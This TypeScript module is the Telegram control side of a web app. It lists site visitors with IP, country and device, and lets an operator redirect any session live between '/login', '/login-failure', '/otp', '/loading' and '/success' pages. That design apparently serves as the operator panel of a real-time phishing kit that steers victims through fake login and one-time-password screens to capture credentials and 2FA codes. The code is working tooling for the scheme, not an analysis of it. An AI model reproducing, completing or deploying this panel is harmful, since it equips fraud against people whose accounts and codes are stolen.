import { db } from "./db";
import { visitors } from "@shared/schema";
import { eq, desc } from "drizzle-orm";

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Send a message to Telegram
export async function sendTelegramMessage(message: string): Promise<boolean> {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error("Telegram credentials not configured");
    return false;
  }

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "HTML",
        }),
      }
    );

    return response.ok;
  } catch (error) {
    console.error("Failed to send Telegram message:", error);
    return false;
  }
}

// Handle /visitors command - List all visitors
export async function handleVisitorsCommand(): Promise<string> {
  try {
    const allVisitors = await db
      .select()
      .from(visitors)
      .orderBy(desc(visitors.lastSeen))
      .limit(20);

    if (allVisitors.length === 0) {
      return "📊 <b>No visitors yet</b>\n\nWaiting for connections...";
    }

    let message = `📊 <b>Active Visitors (${allVisitors.length})</b>\n\n`;

    allVisitors.forEach((visitor, index) => {
      const sessionShort = visitor.sessionId.substring(0, 8);
      const timeSince = getTimeSince(new Date(visitor.lastSeen));
      
      message += `${index + 1}. <b>Session:</b> <code>${sessionShort}</code>\n`;
      message += `   📍 IP: ${visitor.ip} (${visitor.country})\n`;
      message += `   💻 ${visitor.device}\n`;
      message += `   🌐 ${visitor.browser}\n`;
      message += `   📄 Page: ${visitor.currentPage}\n`;
      message += `   🕐 Last seen: ${timeSince} ago\n`;
      
      if (visitor.redirectTarget) {
        message += `   🎯 Redirect set: ${visitor.redirectTarget}\n`;
      }
      
      message += `\n`;
    });

    message += `\n<b>Commands:</b>\n`;
    message += `/redirect &lt;session&gt; &lt;page&gt; - Redirect visitor\n`;
    message += `Example: <code>/redirect ${allVisitors[0].sessionId.substring(0, 8)} /login</code>`;

    return message;
  } catch (error) {
    console.error("Failed to fetch visitors:", error);
    return "❌ <b>Error</b>\n\nFailed to fetch visitors from database.";
  }
}

// Handle /redirect command - Redirect a visitor
export async function handleRedirectCommand(sessionId: string, page: string): Promise<string> {
  try {
    // Find visitor by partial session ID
    const allVisitors = await db.select().from(visitors);
    const visitor = allVisitors.find(v => v.sessionId.startsWith(sessionId));

    if (!visitor) {
      return `❌ <b>Visitor not found</b>\n\nNo visitor with session starting with <code>${sessionId}</code>`;
    }

    // Validate page
    const validPages = ['/login', '/login-failure', '/loading', '/otp', '/success', '/'];
    if (!validPages.includes(page)) {
      return `❌ <b>Invalid page</b>\n\nValid pages: ${validPages.join(', ')}`;
    }

    // Set redirect target
    await db
      .update(visitors)
      .set({ redirectTarget: page })
      .where(eq(visitors.sessionId, visitor.sessionId));

    return `✅ <b>Redirect Set</b>\n\n` +
           `Session: <code>${visitor.sessionId.substring(0, 8)}</code>\n` +
           `Target: <b>${page}</b>\n` +
           `IP: ${visitor.ip} (${visitor.country})\n` +
           `Device: ${visitor.device}\n\n` +
           `The visitor will be redirected within 2 seconds.`;
  } catch (error) {
    console.error("Failed to set redirect:", error);
    return "❌ <b>Error</b>\n\nFailed to set redirect in database.";
  }
}

// Parse and handle Telegram command
export async function handleTelegramCommand(commandText: string): Promise<string> {
  const parts = commandText.trim().split(/\s+/);
  const command = parts[0].toLowerCase();

  switch (command) {
    case "/visitors":
    case "/list":
      return await handleVisitorsCommand();

    case "/redirect": {
      if (parts.length < 3) {
        return `❌ <b>Invalid syntax</b>\n\n` +
               `Usage: <code>/redirect &lt;session&gt; &lt;page&gt;</code>\n\n` +
               `Example: <code>/redirect a1b2c3d4 /login</code>\n\n` +
               `Valid pages: /login, /login-failure, /otp, /success`;
      }
      const sessionId = parts[1];
      const page = parts[2];
      return await handleRedirectCommand(sessionId, page);
    }

    case "/help":
      return `🤖 <b>Admin Bot Commands</b>\n\n` +
             `<code>/visitors</code> - List all active visitors\n` +
             `<code>/redirect &lt;session&gt; &lt;page&gt;</code> - Redirect a visitor\n\n` +
             `<b>Examples:</b>\n` +
             `<code>/visitors</code>\n` +
             `<code>/redirect a1b2c3d4 /login</code>\n` +
             `<code>/redirect a1b2c3d4 /otp</code>\n\n` +
             `<b>Valid pages:</b>\n` +
             `/login, /login-failure, /otp, /success`;

    default:
      return `❌ <b>Unknown command</b>\n\n` +
             `Type <code>/help</code> to see available commands.`;
  }
}

// Utility: Get time since a date
function getTimeSince(date: Date): string {
  const seconds = Math.floor((new Date().getTime() - date.getTime()) / 1000);
  
  if (seconds < 60) return `${seconds}s`;
  if (seconds < 3600) return `${Math.floor(seconds / 60)}m`;
  if (seconds < 86400) return `${Math.floor(seconds / 3600)}h`;
  return `${Math.floor(seconds / 86400)}d`;
}

// Start long polling for Telegram updates (optional - can be called from server/index.ts)
export async function startTelegramBot() {
  if (!TELEGRAM_BOT_TOKEN) {
    console.log("Telegram bot not configured - skipping bot polling");
    return;
  }

  console.log("🤖 Starting Telegram bot...");
  
  let offset = 0;
  
  const poll = async () => {
    try {
      const response = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${offset}&timeout=30`,
        { method: "GET" }
      );

      if (!response.ok) {
        console.error("Telegram API error:", await response.text());
        return;
      }

      const data = await response.json();

      if (data.result && data.result.length > 0) {
        for (const update of data.result) {
          offset = update.update_id + 1;

          if (update.message && update.message.text) {
            const chatId = update.message.chat.id;
            const commandText = update.message.text;

            console.log(`📨 Telegram command: ${commandText}`);

            const response = await handleTelegramCommand(commandText);
            
            // Send response
            await fetch(
              `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
              {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  chat_id: chatId,
                  text: response,
                  parse_mode: "HTML",
                }),
              }
            );
          }
        }
      }
    } catch (error) {
      console.error("Telegram polling error:", error);
    }

    // Continue polling
    setTimeout(poll, 1000);
  };

  poll();
}
